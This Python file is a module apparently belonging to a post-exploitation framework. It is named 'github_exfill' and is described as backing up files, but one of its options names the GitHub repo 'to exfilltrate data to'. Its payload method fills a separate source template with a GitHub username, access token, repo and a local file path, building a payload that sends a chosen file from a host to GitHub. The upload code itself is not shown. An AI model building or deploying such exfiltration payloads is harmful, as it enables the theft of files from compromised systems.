from core.module import Module


class STModule(Module):
    def __init__(self):
        Module.__init__(self)
        self.name = 'github_exfill'
        self.description = 'Backs up files to a github repo'
        self.author = 'Tristan Messner'
        self.options = {
            'Username': {
                'Description': 'The username of your github account',
                'Required': True,
                'Value': ''
            },
            'PAT': {
                'Description': 'Your github personal access token',
                'Required': True,
                'Value': ''
            },
            'Repo': {
                'Description': 'The github repo to exfilltrate data to',
                'Required': True,
                'Value': ''
            },
            'Repo_path': {
                'Description': 'The file path to store the backup file. should end with a /',
                'Required': True,
                'Value': ''
            },
            'Repo_file': {
                'Description': 'The name to store the backup file under',
                'Required': True,
                'Value': ''
            },
            'Local_file': {
                'Description': 'The path to the local file to backup',
                'Required': True,
                'Value': ''
            }
        }

    def payload(self):
        with open('modules/src/github_exfill.py', 'r') as module_src:
            src = module_src.read()
            src = src.replace("GHUSER", self.options['Username']['Value'])
            src = src.replace("GH_PAT", self.options['PAT']['Value'])
            src = src.replace("GHREPO", self.options['Repo']['Value'])
            src = src.replace("GHPATH", self.options['Repo_path']['Value'])
            src = src.replace("GHFILE", self.options['Repo_file']['Value'])
            src = src.replace("LOCALFILE", self.options['Local_file']['Value'])
            return src.encode()
